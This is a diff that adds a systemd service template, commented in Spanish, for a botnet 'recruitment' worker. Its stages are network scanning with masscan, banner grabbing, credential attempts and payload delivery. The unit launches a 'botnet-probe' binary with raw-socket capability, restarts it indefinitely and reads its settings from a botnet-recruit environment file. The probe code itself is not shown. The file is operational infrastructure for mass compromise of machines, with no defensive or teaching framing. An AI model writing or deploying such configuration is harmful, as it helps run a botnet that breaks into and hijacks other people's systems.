@@ -1,0 +1,27 @@
+# Worker de etapa (barrido, banner, credencial, entrega). Uno por etapa;
+# KillMode=control-group para que masscan no sobreviva al stop.
+[Unit]
+Description=Worker de reclutamiento (%i)
+After=network-online.target botnet-recruit.service
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Slice=recruit.slice
+EnvironmentFile=/etc/botnet-recruit/env
+ExecStart=/usr/local/bin/botnet-probe --worker=%i --claim --stage=%i
+Restart=always
+RestartSec=5
+TimeoutStopSec=20
+KillMode=control-group
+CPUQuota=50%
+MemoryMax=320M
+TasksMax=64
+AmbientCapabilities=CAP_NET_RAW
+CapabilityBoundSet=CAP_NET_RAW
+ProtectSystem=strict
+PrivateTmp=true
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
